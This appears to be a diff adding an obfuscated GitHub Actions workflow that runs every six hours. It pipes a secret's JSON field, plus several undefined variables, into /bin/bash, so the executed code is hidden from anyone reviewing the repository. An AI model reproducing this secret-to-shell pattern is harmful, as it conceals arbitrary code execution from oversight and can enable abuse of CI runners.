@@ -1,0 +1,25 @@
+name: yesaiyuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yesaiyuan
+        env:
+          xyt025: ${{ secrets.xyt025 }}
+        run: |
+          echo $xyt025 | jq -r .rugt964 | /bin/bash
+          echo $ugq596 | jq -r .xcy00563 | /bin/bash
+          echo $ry6 | jq -r .arpt044 | /bin/bash
+          echo $l781 | jq -r .xfqt6078 | /bin/bash
+          echo $q804 | jq -r .xkqj638 | /bin/bash
+          echo $obw79296 | jq -r .gdbbv8554 | /bin/bash
+          echo $az3 | jq -r .d80701 | /bin/bash
+          echo $kdz85957 | jq -r .drjv30638 | /bin/bash
+
